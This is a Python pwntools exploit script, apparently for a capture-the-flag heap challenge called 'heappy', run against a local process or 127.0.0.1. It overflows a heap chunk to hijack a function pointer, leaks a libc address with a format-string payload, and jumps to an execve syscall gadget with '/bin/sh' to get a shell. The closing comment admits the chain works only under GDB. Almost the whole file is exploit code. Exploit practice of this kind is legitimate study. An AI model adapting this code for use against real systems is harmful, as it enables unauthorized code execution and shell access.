from pwn import *


def recv_n_lines(r, n):
    for _ in range(n):
        r.recvline()


def main():
    local = True
    elf = ELF("./heappy")
    libc = ELF("./libc-2.19.so")
    context.binary = elf
    if local:
        r = process(["./heappy"])
    else:
        r = remote("127.0.0.1", 5000)
    padding = 144
    target = elf.symbols['printf'] # for leakage
    payload = b'A' * padding + p64(target)
    recv_n_lines(r, 4)
    # choose language
    r.sendline("1")
    recv_n_lines(r, 2)
    # choose name
    r.sendline("pwn")
    recv_n_lines(r, 5)
    # change language -> allocate new chunk
    r.sendline("2")
    recv_n_lines(r, 4)
    # ita language
    r.sendline("2")
    recv_n_lines(r, 5)
    # change name
    r.sendline("1")
    recv_n_lines(r, 2)
    # overflow in functions' chunk
    r.sendline(payload)
    r.recvuntil('nome?')
    # for libc leak
    r.sendline('%13$p')
    r.recvuntil('nome?')
    # now the program is buggy and always asks for name
    r.sendline('pwn')
    r.recvline()
    leak = r.recvline()
    leak = bytes.fromhex(leak.split(b'0x')[1][:12].decode())[::-1]
    leak = u64(leak + b'\x00' * 2)
    libc.address = leak - 234 - libc.symbols["__libc_start_main"]
    # mov $0x3b,$eax; syscall; ...; ret
    # if sys_execve fails, it doesn't crash, but returns a negative value in rax
    sys_execve_gadget = libc.address + 0xc5125
    payload = b"A" * padding + p64(sys_execve_gadget)
    r.recvuntil('?')
    r.sendline(payload)
    target = b"/bin/sh"
    # _go = input()     # for stopping the program and attach gdb ( gdb -p PID )
    # to make the scanf("%s", name) put a NULL byte at the [9; 9+7]th positions of the buffer
    for i in range((len(target) + 8), len(target), -1):
        payload = b"A" * i
        r.recvuntil('?')
        r.sendline(payload)
    # after sending the following payload, we'll have ( b"/bin/sh\x00" + b"\x00" * 8 ) in the buffer
    # both rdi and rdx point to the buffer; rsi points to a memory area composed of null bytes
    # we want to set rsi=&rdi=rsp+40(+8 after 'call') and rdx=0; actually, I can set both rsi and rdx to 0
    payload = target
    r.recvuntil('?')
    r.sendline(payload)
    r.interactive()
    # it works in GDB but I don't find gadgets to perform changes to rsi and rdx while retaining control of rip


if __name__ == "__main__":
    main()

    

 
